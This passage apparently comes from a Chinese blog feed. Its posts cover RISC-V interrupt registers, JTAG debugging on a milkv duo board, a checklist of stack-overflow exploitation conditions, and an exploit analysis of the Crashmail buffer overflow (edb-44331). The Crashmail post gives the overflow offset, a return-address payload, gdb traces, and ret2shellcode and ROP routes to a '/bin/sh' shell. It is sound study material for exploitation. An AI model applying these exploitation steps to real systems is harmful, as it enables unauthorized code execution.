<h3 id="1-为什么中断未触发"><strong>(1) 为什么中断未触发？</strong></h3>

<ul>
  <li>检查顺序：
    <ol>
      <li><strong><code class="language-plaintext highlighter-rouge">mstatus.MIE</code></strong>是否为<strong><code class="language-plaintext highlighter-rouge">1</code></strong>？</li>
      <li><strong><code class="language-plaintext highlighter-rouge">mie</code></strong>中对应位（如<strong><code class="language-plaintext highlighter-rouge">MTIE</code></strong>）是否使能？</li>
      <li>中断是否已挂起（如<strong><code class="language-plaintext highlighter-rouge">mip.MTIP=1</code></strong>）？</li>
    </ol>
  </li>
</ul>

<h3 id="2-安全性与优先级"><strong>(2) 安全性与优先级</strong></h3>

<ul>
  <li><strong>关键操作期间</strong>：通常先关闭<strong><code class="language-plaintext highlighter-rouge">mstatus.MIE</code></strong>，再操作敏感寄存器，避免中断干扰。</li>
  <li><strong>嵌套中断</strong>：RISC-V默认不支持M模式中断嵌套（进入中断后<strong><code class="language-plaintext highlighter-rouge">MIE</code></strong>自动清零），需软件管理。</li>
</ul>

<h3 id="3-与s模式的关系"><strong>(3) 与S模式的关系</strong></h3>

<ul>
  <li>若中断委托给S模式（通过<strong><code class="language-plaintext highlighter-rouge">mideleg</code></strong>），则S模式的<strong><code class="language-plaintext highlighter-rouge">sstatus.SIE</code></strong>和<strong><code class="language-plaintext highlighter-rouge">sie</code></strong>寄存器将接管控制权，M模式的<strong><code class="language-plaintext highlighter-rouge">MIE</code></strong>和<strong><code class="language-plaintext highlighter-rouge">mie</code></strong>不再影响已委托的中断。</li>
</ul>

<h3 id="6-对比其他架构"><strong>6. 对比其他架构</strong></h3>

<table>
  <thead>
    <tr>
      <th><strong>架构</strong></th>
      <th><strong>全局中断控制</strong></th>
      <th><strong>局部中断控制</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>RISC-V</td>
      <td><strong><code class="language-plaintext highlighter-rouge">mstatus.MIE</code></strong></td>
      <td><strong><code class="language-plaintext highlighter-rouge">mie.&lt;x&gt;IE</code></strong></td>
    </tr>
    <tr>
      <td>ARM</td>
      <td><strong><code class="language-plaintext highlighter-rouge">DAIF.{I,F}</code></strong> (PSR寄存器)</td>
      <td><strong><code class="language-plaintext highlighter-rouge">GICD_ISENABLER</code></strong> (中断控制器)</td>
    </tr>
    <tr>
      <td>x86</td>
      <td><strong><code class="language-plaintext highlighter-rouge">EFLAGS.IF</code></strong></td>
      <td><strong><code class="language-plaintext highlighter-rouge">APIC/LVT</code></strong> 寄存器</td>
    </tr>
  </tbody>
</table>

<h3 id="7-总结"><strong>7. 总结</strong></h3>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">mstatus.MIE</code>是总开关</strong>，<strong><code class="language-plaintext highlighter-rouge">mie</code></strong>是分路开关，二者<strong>“与”逻辑</strong>决定中断是否生效。</li>
  <li>实际开发中需协同配置这两个寄存器，并注意硬件自动清除<strong><code class="language-plaintext highlighter-rouge">MIE</code></strong>的行为。</li>
  <li>在操作系统或安全敏感场景中，需谨慎管理中断使能状态以避免竞态条件。</li>
</ul>]]></content><author><name></name></author><category term="riscv" /><summary type="html"><![CDATA[和中断相关的几个寄存器的含义和使用方法，以及相互之间的关系]]></summary></entry><entry><title type="html">milkv duo 256M开发板JTAG调试方法</title><link href="http://localhost:4000/riscv/2025/05/07/milkv-duo-256M%E5%BC%80%E5%8F%91%E6%9D%BFJTAG%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95.html" rel="alternate" type="text/html" title="milkv duo 256M开发板JTAG调试方法" /><published>2025-05-07T13:27:38+08:00</published><updated>2025-05-07T13:27:38+08:00</updated><id>http://localhost:4000/riscv/2025/05/07/milkv-duo-256M%E5%BC%80%E5%8F%91%E6%9D%BFJTAG%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95</id><content type="html" xml:base="http://localhost:4000/riscv/2025/05/07/milkv-duo-256M%E5%BC%80%E5%8F%91%E6%9D%BFJTAG%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95.html"><![CDATA[<p>本文将深入探讨如何为 milkv duo 256M 开发板开启JTAG调试之门。我将从硬件连接、软件环境配置入手，详细讲解如何利用JTAG接口实现系统级调。</p>

<h2 id="调试架构">调试架构</h2>

<p>淘宝cklink-lite调试器，milkv duo256m开发板，杜邦线若干，usb串口调试线：</p>

<p><img src="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/milkv_duo256m_jtag%E8%B0%83%E8%AF%95%E5%8E%9F%E7%90%86.jpg" alt="milkv duo256m jtag调试原理.jpg" /></p>

<ol>
  <li>上位机运行玄铁官方的XuanTie-DebugServer用于和cklink-lite通信，同时开放调试端口给gdb；</li>
  <li>上位机运行gdb-multiarch连接到DebugServer，发送调试命令，接收调试数据；</li>
  <li>cklink-lite起到代理的作用，接收来自上位机的调试命令，把调试命令转化为JTAG协议发送到开发板，解析开发板回传的调试数据，发送回上位机DebugServer；</li>
  <li>上位机DebugServer把接收到的调试数据返回给gdb，完成一条调试命令。</li>
</ol>

<h2 id="开发板接线">开发板接线</h2>

<p>cklink-lite调试的的TCK、TMS、TDO、TDI、GND分别连接到开发板对应的引脚。注意GND线要接，否则上位机无法通过cklink-lite连接上开发板。</p>

<p><img src="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/%E6%88%AA%E5%B1%8F2025-02-15_10.45.14.png" alt="截屏2025-02-15 10.45.14.png" /></p>

<h2 id="上位机准备">上位机准备</h2>

<p>从玄铁官网下载DebugServer，执行安装命令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod</span> +x XuanTie_DebugServer-linux-x86_64-V5.18.3-20241119.sh
<span class="nv">$ </span><span class="nb">sudo</span> ./XuanTie_DebugServer-linux-x86_64-V5.18.3-20241119.sh <span class="nt">-i</span>
</code></pre></div></div>

<p><a href="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/XuanTie-DebugServer-linux-x86_64-V5.18.3-20241119.sh">XuanTie-DebugServer-linux-x86_64-V5.18.3-20241119.sh</a></p>

<p>需要注意的是，DebugServer安装过程中会把/usr/bin/XUANTIE_DebugServer目录添加到动态链接库搜索路径中，这会干扰其他引用的正常运行，解决方法是：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 删除动态链接库缓存文件
<span class="nv">$ </span><span class="nb">sudo rm</span> /etc/ld.so.conf.d/csky-debug.conf
<span class="nv">$ </span><span class="nb">sudo </span>ldconfig

</code></pre></div></div>

<p>DebugServerConsole是/usr/bin目录下的脚本文件，在第一行添加cd命令，使得每次运行之前先进入到安装目录，所有DebugServerConsole依赖的库文件都在安装目录下。</p>

<p><img src="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/%E6%88%AA%E5%B1%8F2025-02-17_12.54.16.png" alt="截屏2025-02-17 12.54.16.png" /></p>

<h2 id="使能jtag调试功能">使能jtag调试功能</h2>

<p>查看SG2002芯片手册可知，内存地址0x03001064、0x03001068、0x03001070、0x03001074对应的寄存器分别控制TMS、TCK、TDI、TDO功能的开启。</p>

<p>这四个地址保存的值默认为0，也就是系统一上电默认开启JTAG调试功能。</p>

<p>此时可以调试从FSBL—&gt;uboot—&gt;opensbi这个阶段的程序。</p>

<p><img src="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/%E6%88%AA%E5%B1%8F2025-02-15_13.55.40.png" alt="截屏2025-02-15 13.55.40.png" /></p>

<p>Linux内核启动之后，这四个地址分别都被写入了非零值，应该是内核初始化过程中对JTAG引脚的功能进行了重新设置：</p>

<p><img src="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/%E6%88%AA%E5%B1%8F2025-02-15_14.03.05.png" alt="截屏2025-02-15 14.03.05.png" /></p>

<p>我们把它重新写成0:</p>

<p><img src="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/%E6%88%AA%E5%B1%8F2025-02-15_14.10.10.png" alt="截屏2025-02-15 14.10.10.png" /></p>

<p>再用gdb-multiarch去连：</p>

<p><img src="/assets/posts/2025-05-07-milkv-duo-256M开发板JTAG调试方法/%E6%88%AA%E5%B1%8F2025-02-15_14.12.31.png" alt="截屏2025-02-15 14.12.31.png" /></p>

<h2 id="参考资料">参考资料</h2>

<p>JTAG入门之使用JTAG调试路由器：</p>

<p><a href="https://www.iotsec-zone.com/article/375">物联网安全从零开始-路由器jtag调试分析 - IOTsec-Zone</a></p>

<p><a href="https://club.rt-thread.org/ask/article/5c9e1b656dd77b9c.html">RT-Thread-MilkV Duo 使用 CK-Link DebugRT-Thread问答社区 - RT-Thread</a></p>

<p><a href="https://community.milkv.io/t/jtag-jtag-debug-guide-for-duo/1138">【jtag】Jtag debug guide for Duo</a></p>

<p>修改fip.bin文件添加JTAG调试功能：</p>

<p><a href="https://github.com/pigmoral/duo-buildroot-sdk/commit/c198e570fd25c94260e1024df991c9914c6d4680">Add jtag function for duo-64. · pigmoral/duo-buildroot-sdk@c198e57</a></p>]]></content><author><name></name></author><category term="riscv" /><summary type="html"><![CDATA[本文将深入探讨如何为 milkv duo 256M 开发板开启JTAG调试之门。我将从硬件连接、软件环境配置入手，详细讲解如何利用JTAG接口实现系统级调。]]></summary></entry><entry><title type="html">栈溢出利用条件分析</title><link href="http://localhost:4000/userspace/2025/04/18/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90.html" rel="alternate" type="text/html" title="栈溢出利用条件分析" /><published>2025-04-18T18:27:38+08:00</published><updated>2025-04-18T18:27:38+08:00</updated><id>http://localhost:4000/userspace/2025/04/18/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90</id><content type="html" xml:base="http://localhost:4000/userspace/2025/04/18/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90.html"><![CDATA[<p>是不是下面这些问题解决了，才会有后面的地址泄露、rop执行、shellcode执行这些利用手段？</p>

<p>这些问题不回答清楚，往往后面的事情想了一半才发现前面的条件不满足，又回过头来思考前面这些问题，造成了时间的浪费，精力的损耗。</p>

<h1 id="栈溢出关注的点">栈溢出关注的点</h1>

<p>是不是下面这些问题解决了，才会有后面的地址泄露、rop执行、shellcode执行这些利用手段？</p>

<p>这些问题不回答清楚，往往后面的事情想了一半才发现前面的条件不满足，又回过头来思考前面这些问题，造成了时间的浪费，精力的损耗。</p>

<ul>
  <li>保护情况怎么样？按照关注度排序
    <ul>
      <li>Canary，有了它是不是直接就宣告死亡了？</li>
      <li>NX</li>
      <li>ASLR、PIE</li>
    </ul>
  </li>
  <li>是否可以交互？</li>
</ul>

<p>这个决定了后面的漏洞利用是payload一把梭哈，还是可以多次交互把漏洞利用过程分为多步来实现</p>

<ul>
  <li>覆盖的长度是多少？
    <ul>
      <li>部分覆盖返回地址，那么就只能做partial overwrite返回到有限的地址范围</li>
      <li>完全覆盖返回地址</li>
      <li>往返回地址后面继续覆盖
        <ul>
          <li>返回地址后面还可以写有限个字节，rop或者shellcode要控制长度</li>
          <li>无限长度写，任意长度rop或者shellcode</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>攻击者对覆盖的内容是否可控？
    <ul>
      <li>完全可控，不添加任何其他内容</li>
      <li>部分可控，程序会往中间或者两头加入东西，或者做内容过滤
        <ul>
          <li>末尾写0</li>
          <li>末尾写入其他字符串</li>
          <li>如果有内容过滤，那么payload要尝试避开这些东西</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>是否存在NULL字符截断？
    <ul>
      <li>不存在，攻击者可以往栈上面写NULL</li>
      <li>存在，一旦写入NULL就会截断</li>
    </ul>
  </li>
</ul>

<p>以上这些点既是具体问题的抽象总结，又离不开具体问题具体分析！</p>

<p>以上栈溢出漏洞条件的每一种排列组合情况，如果人类都能够找到利用的方式，那么机器也应该可以学会。</p>

<p>strcpy溢出，要解决x64模式下的0截断问题</p>

<h1 id="栈溢出的一些终止条件">栈溢出的一些终止条件</h1>

<ul>
  <li>遇到Canary</li>
  <li>（x64环境下） &amp;&amp; （ 存在NULL字符截断） &amp;&amp; （末尾会添加攻击者不可控的内容）
    <ul>
      <li><a href="https://www.notion.so/Crashmail-1-6-1d73f4b7819d8049b9fcfc9dff8a19ae?pvs=21">crashmail</a>栈溢出</li>
      <li><a href="https://www.notion.so/Exim-4-41-dns_build_reverse-1c23f4b7819d80f490c3e4fc91884fe7?pvs=21">exim</a>栈溢出</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="userspace" /><summary type="html"><![CDATA[是不是下面这些问题解决了，才会有后面的地址泄露、rop执行、shellcode执行这些利用手段？]]></summary></entry><entry><title type="html">Crashmail 栈溢出漏洞分析</title><link href="http://localhost:4000/userspace/2025/04/17/Crashmail-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" rel="alternate" type="text/html" title="Crashmail 栈溢出漏洞分析" /><published>2025-04-17T13:27:38+08:00</published><updated>2025-04-17T13:27:38+08:00</updated><id>http://localhost:4000/userspace/2025/04/17/Crashmail%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</id><content type="html" xml:base="http://localhost:4000/userspace/2025/04/17/Crashmail-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"><![CDATA[<p>CrashMail 是一款早期的开源 DOS 系统下的 BBS 邮件处理工具。
漏洞编号：edb-44331
利用环境：ubuntu 20.04，源代码32位编译</p>

<h1 id="漏洞信息">漏洞信息</h1>

<p>CrashMail 是一款早期的开源 DOS 系统下的 BBS 邮件处理工具。</p>

<p>漏洞编号：edb-44331</p>

<p>利用环境：ubuntu 20.04，源代码32位编译</p>

<p>内存控制能力：</p>

<ul>
  <li>有NULL截断</li>
  <li>攻击者对输入内容不完全可控，payload末尾会添加“.busy”字符串</li>
</ul>

<h1 id="漏洞分析">漏洞分析</h1>

<p>以下是对x86程序的分析</p>

<p>漏洞函数位是LockConfig，由main函数直接调用：</p>

<p><img src="/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail.jpg" alt="crashmail.jpg" /></p>

<p>漏洞位置很明显，file字符串使用strcpy函数直接拷贝到buf[200]数组中，并且在末尾添加了“.busy”的字符串。</p>

<p>所以溢出的对象是LockConfig函数的buf数组，覆盖的返回值是LockConfig函数到main函数的返回地址，存在NULL字符截断，攻击者的输入内容不完全可控。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bool</span> <span class="nf">LockConfig</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>
	<span class="n">osFile</span> <span class="n">fp</span><span class="p">;</span>
	
	<span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">file</span><span class="p">);</span>
	<span class="n">strcat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="s">".busy"</span><span class="p">);</span>

	<span class="p">......</span>
	
	<span class="n">osClose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>

	<span class="k">return</span><span class="p">(</span><span class="n">TRUE</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>若攻击者输入如下命令行参数，那么一长串字符‘c’就会被当做参数传递给LockConfig函数</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./crashmail <span class="s2">"SETTINGS"</span> ccccccccccccccccccccccccccccccccccccccccccccccccccc
</code></pre></div></div>

<p>main函数对参数的解析如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">cfg</span><span class="p">;</span>
   <span class="kt">uint32_t</span> <span class="n">cfgline</span><span class="p">;</span>
   <span class="kt">short</span> <span class="n">seconderr</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">errorbuf</span><span class="p">[</span><span class="mi">500</span><span class="p">];</span>

   <span class="n">signal</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span><span class="n">breakfunc</span><span class="p">);</span>

   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">osInit</span><span class="p">())</span>
      <span class="n">CleanUp</span><span class="p">(</span><span class="n">OS_EXIT_ERROR</span><span class="p">);</span>

   <span class="n">done_osinit</span><span class="o">=</span><span class="n">TRUE</span><span class="p">;</span>

   <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span>
	  <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">"?"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span>      <span class="o">||</span>
		<span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">"-h"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span>     <span class="o">||</span>
		<span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">"--help"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span> <span class="o">||</span>
		<span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">"help"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span> <span class="o">||</span>
		<span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">"/h"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span>     <span class="o">||</span>
		<span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">"/?"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span> <span class="p">))</span>
   <span class="p">{</span>
      <span class="n">printargs</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
      <span class="n">CleanUp</span><span class="p">(</span><span class="n">OS_EXIT_OK</span><span class="p">);</span>
   <span class="p">}</span>

   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">parseargs</span><span class="p">(</span><span class="n">args</span><span class="p">,</span><span class="n">argc</span><span class="p">,</span><span class="n">argv</span><span class="p">))</span><span class="c1">// 分析命令行参数，若有“SETTINGS”，那么随后的字符串</span>
															   <span class="c1">// 就是文件名，被保存到args[ARG_SETTINGS].data</span>
      <span class="n">CleanUp</span><span class="p">(</span><span class="n">OS_EXIT_ERROR</span><span class="p">);</span>

   <span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="n">ARG_VERSION</span><span class="p">].</span><span class="n">data</span><span class="p">)</span>
   <span class="p">{</span>
      <span class="n">Version</span><span class="p">();</span>
      <span class="n">CleanUp</span><span class="p">(</span><span class="n">OS_EXIT_OK</span><span class="p">);</span>
   <span class="p">}</span>

	<span class="n">cfg</span><span class="o">=</span><span class="n">getenv</span><span class="p">(</span><span class="n">OS_CONFIG_VAR</span><span class="p">);</span>

   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">cfg</span><span class="p">)</span>
		<span class="n">cfg</span><span class="o">=</span><span class="n">OS_CONFIG_NAME</span><span class="p">;</span>

   <span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="n">ARG_SETTINGS</span><span class="p">].</span><span class="n">data</span><span class="p">)</span>
      <span class="n">cfg</span><span class="o">=</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">[</span><span class="n">ARG_SETTINGS</span><span class="p">].</span><span class="n">data</span><span class="p">;</span>    <span class="c1">// cfg 可以由“SETTINGS”命令行参数指定</span>

   <span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="n">ARG_LOCK</span><span class="p">].</span><span class="n">data</span><span class="p">)</span>
   <span class="p">{</span>
		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">LockConfig</span><span class="p">(</span><span class="n">cfg</span><span class="p">))</span>        <span class="c1">// 如果命令行参数中有“LOCK”，那么先走这里的LockConfig</span>
		<span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"Failed to lock configuration file %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">cfg</span><span class="p">);</span>
			<span class="n">CleanUp</span><span class="p">(</span><span class="n">OS_EXIT_ERROR</span><span class="p">);</span>
		<span class="p">}</span>
		
		<span class="n">printf</span><span class="p">(</span><span class="s">"CrashMail is now locked, use UNLOCK to unlock</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> 
		<span class="n">CleanUp</span><span class="p">(</span><span class="n">OS_EXIT_OK</span><span class="p">);</span>
	<span class="p">}</span>

 <span class="p">......</span>

	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">done_lockconfig</span><span class="o">=</span><span class="n">LockConfig</span><span class="p">(</span><span class="n">cfg</span><span class="p">)))</span> <span class="c1">// 这里也有LockConfig，cfg参数攻击者指定</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Failed to lock configuration file %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">cfg</span><span class="p">);</span>
		<span class="n">CleanUp</span><span class="p">(</span><span class="n">OS_EXIT_ERROR</span><span class="p">);</span>
	<span class="p">}</span>

</code></pre></div></div>

<p>从反汇编可以观察到buf数组到保存的rbp距离为0xd4，那么到返回地址的距离就是0xd8</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>text:0804A913 <span class="p">;</span> bool __cdecl LockConfig<span class="o">(</span>char <span class="k">*</span>file<span class="o">)</span>
.text:0804A913                 public LockConfig
.text:0804A913 LockConfig      proc near               <span class="p">;</span> CODE XREF: main+1CE↓p
.text:0804A913                                         <span class="p">;</span> main+264↓p
.text:0804A913
.text:0804A913 buf             <span class="o">=</span> byte ptr <span class="nt">-0D4h</span>
.text:0804A913 fp              <span class="o">=</span> dword ptr <span class="nt">-0Ch</span>
.text:0804A913 file            <span class="o">=</span> dword ptr  8
.text:0804A913
.text:0804A913 <span class="p">;</span> __unwind <span class="o">{</span>
.text:0804A913                 endbr32
.text:0804A917                 push    ebp
.text:0804A918                 mov     ebp, esp
.text:0804A91A                 push    edi
.text:0804A91B                 push    ebx
.text:0804A91C                 sub     esp, 0D0h
.text:0804A922                 call    __x86_get_pc_thunk_bx
.text:0804A927                 add     ebx, <span class="o">(</span>offset _GLOBAL_OFFSET_TABLE_ - <span class="nv">$)</span>
.text:0804A92D                 sub     esp, 8
.text:0804A930                 push    <span class="o">[</span>ebp+file]      <span class="p">;</span> src
.text:0804A933                 lea     eax, <span class="o">[</span>ebp+buf]
.text:0804A939                 push    eax             <span class="p">;</span> dest
</code></pre></div></div>

<p>攻击者构造如下启动命令就能造成返回地址覆盖为0xdeadbeef</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload <span class="o">=</span> b<span class="s1">'\x90'</span> <span class="k">*</span> 0xd8 + p32<span class="o">(</span>0xdeadbeef<span class="o">)</span>
</code></pre></div></div>

<h1 id="关键状态调试">关键状态调试</h1>

<h2 id="x86下的调试">x86下的调试</h2>

<p>断点位置选0x804AA19，也就是LockConfig函数ret之前</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:0804AA13
.text:0804AA13 loc_804AA13:                            <span class="p">;</span> CODE XREF: LockConfig+95↑j
.text:0804AA13                                         <span class="p">;</span> LockConfig+EB↑j
.text:0804AA13                 lea     esp, <span class="o">[</span>ebp-8]
.text:0804AA16                 pop     ebx
.text:0804AA17                 pop     edi
.text:0804AA18                 pop     ebp
.text:0804AA19                 retn
.text:0804AA19 <span class="p">;</span> <span class="o">}</span> // starts at 804A913
.text:0804AA19 LockConfig      endp
.text:0804AA19
</code></pre></div></div>

<p>可以观察到buf数组地址为0xffad1a24，此时和栈地址相关的寄存器除了esp还有esi，esi寄存器的值为0xffad1d50，相对buf数组在高位，esi指向的位置距离返回地址</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Breakpoint 1, 0x0804aa19 <span class="k">in </span>LockConfig <span class="o">(</span>                                              │sh: 1: .busy: not found
    <span class="nv">file</span><span class="o">=</span>0x80649cf &lt;Filter_Execute+525&gt; <span class="s2">"P</span><span class="se">\3</span><span class="s2">50"</span>, &lt;incomplete sequence <span class="se">\3</span>53&gt;<span class="o">)</span>          │test@0c3259477029:/test<span class="nv">$ </span><span class="nb">ls
    </span>at crashmail/crashmail.c:505                                                      │bin                 crashmail-1.6         enter_container.sh  exp2.py
505     <span class="o">}</span>                                                                             │container_start.sh  crashmail-1.6.tar.gz  exp1.py
0xffad1d50:     0x69622f2f      0x68732f6e      0x75622e23      0xff007973            │test@0c3259477029:/test<span class="nv">$ </span>./exp2.py 
0xffad1d60:     0xf7f95000      0x00000000      0xffad1dc8      0x00000000            │Failed to create lock file 
0xffad1d70:     0xf7fdb000      0x00000000      0xf7f95000      0xf7f95000            │sh: 1: .busy: not found
0xffad1d80:     0x00000000      0x9667f81c      0x74c07e0c      0x00000000            │test@0c3259477029:/test<span class="nv">$ </span>./exp2.py 
<span class="o">(</span>gdb<span class="o">)</span> info reg                                                                        │Failed to create lock file 
eax            0x0                 0                                                  │sh: 1: .busy: not found
ecx            0x0                 0                                                  │test@0c3259477029:/test<span class="nv">$ </span>./exp2.py 
edx            0x807437a           134693754                                          │Failed to create lock file 
ebx            0x90909090          <span class="nt">-1869574000</span>                                        │sh: 1: .busy: not found
esp            0xffad1afc          0xffad1afc                                         │test@0c3259477029:/test<span class="nv">$ </span><span class="nb">ls</span> | .busy
ebp            0x90909090          0x90909090                                         │-bash: .busy: <span class="nb">command </span>not found
esi            0xffad1d50          <span class="nt">-5431984</span>                                           │test@0c3259477029:/test<span class="nv">$ </span><span class="nb">ls       
</span>edi            0x90909090          <span class="nt">-1869574000</span>                                        │bin                 crashmail-1.6         enter_container.sh  exp2.py
eip            0x804aa19           0x804aa19 &lt;LockConfig+262&gt;                         │container_start.sh  crashmail-1.6.tar.gz  exp1.py
eflags         0x282               <span class="o">[</span> SF IF <span class="o">]</span>                                          │test@0c3259477029:/test<span class="nv">$ </span><span class="nb">ls</span><span class="c">#.busy  </span>
cs             0x23                35                                                 │-bash: <span class="nb">ls</span><span class="c">#.busy: command not found</span>
ss             0x2b                43                                                 │test@0c3259477029:/test<span class="nv">$ </span><span class="nb">ls</span> <span class="c">#.busy</span>
ds             0x2b                43                                                 │bin                 crashmail-1.6         enter_container.sh  exp2.py
es             0x2b                43                                                 │container_start.sh  crashmail-1.6.tar.gz  exp1.py
fs             0x0                 0                                                  │test@0c3259477029:/test<span class="nv">$ </span>./exp2.py 
gs             0x63                99   
<span class="o">(</span>gdb<span class="o">)</span> p &amp;buf                                                                          │l<span class="s1">', '</span><span class="nt">-x</span><span class="s1">', '</span>/tmp/pwnlib-gdbscript-rsi1he64.gdb<span class="s1">']
$1 = (char (*)[200]) 0xffad1a24                                                       │[*] Paused (press any to continue)
(gdb)                                 
</span></code></pre></div></div>

<p>esi寄存器位于栈的高地址，这个有利的情况有助于我们解决2个矛盾：</p>

<ul>
  <li>ret2shellcode利用方式中，在当前程序里面找不到“jmp esp”指令</li>
</ul>

<p>我们可以把shellcode放到esi指向的位置后面，使用“xchg”指令把esi寄存器交换到eax寄存器中，再“jmp eax”跳转到shellcode执行。此种方式栈布局如下：</p>

<p><img src="/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail-ret2shellcode.jpg" alt="crashmail-ret2shellcode.jpg" /></p>

<ul>
  <li>rop利用方式中，找不到已知地址用来放字符串”/bin/sh”：</li>
</ul>

<p>在可执行程序中可以找到命令执行函数osExecute：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int osExecute<span class="o">(</span>char <span class="k">*</span>cmd<span class="o">){</span>
   int res<span class="p">;</span>
   <span class="nv">res</span><span class="o">=</span>system<span class="o">(</span>cmd<span class="o">)</span><span class="p">;</span>
   <span class="k">return </span>WEXITSTATUS<span class="o">(</span>res<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div></div>

<p>在地址 0x80649CF 处对cmd参数地址进行了压栈：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:080649CF                 push    eax             <span class="p">;</span> cmd
.text:080649D0                 call    osExecute
.text:080649D5                 add     esp, 10h
.text:080649D8                 mov     <span class="o">[</span>ebp+arcres], eax
</code></pre></div></div>

<p>因此我们可以在esi指向的栈中布置字符串“//bin/sh #”，其中“#”是为了注释掉“.busy”字符串，排除掉不可控字符串对命令执行的干扰，形成如下调用：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">system</span><span class="p">(</span><span class="s">"//bin/sh #.busy"</span><span class="p">);</span>
</code></pre></div></div>

